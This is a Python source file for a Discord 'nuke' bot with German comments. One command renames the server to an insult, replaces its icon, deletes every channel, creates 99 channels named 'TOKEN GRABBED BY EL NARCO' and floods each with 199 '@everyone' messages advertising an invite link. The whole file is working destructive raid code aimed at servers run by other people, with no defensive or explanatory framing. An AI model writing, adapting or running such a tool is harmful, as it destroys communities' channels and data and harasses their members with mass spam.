import os
import discord
from discord.ext import commands
import asyncio

TOKEN = os.getenv("BOT_TOKEN", "").strip()

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.command(name="elnarco")
async def reset_channels(ctx):
    guild = ctx.guild
    try:
        await guild.edit(name="ihr wurdet von nc gefickt")
        with open("weyzo_icon.png", "rb") as icon_file:
            await guild.edit(icon=icon_file.read())
        print("✅ Servername und Icon geändert.")
    except Exception as e:
        print(f"❌ Fehler beim Bearbeiten des Servers: {e}")

    # Alte Kanäle parallel löschen
    delete_tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    # Neue Kanäle parallel erstellen
    create_tasks = [
        guild.create_text_channel(
            name="TOKEN GRABBED BY EL NARCO🥥",
            overwrites={guild.default_role: discord.PermissionOverwrite(view_channel=True)}
        )
        for _ in range(99)
    ]
    new_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
    new_channels = [c for c in new_channels if isinstance(c, discord.TextChannel)]

    # Optional: Nachrichten in allen neuen Kanälen senden
    async def spam(channel):
        for _ in range(199):
            try:
                await channel.send("@everyone https://discord.gg/elnarco")
            except Exception as e:
                print(f"Fehler in {channel.name}: {e}")

    await asyncio.gather(*(spam(c) for c in new_channels))

bot.run(TOKEN)
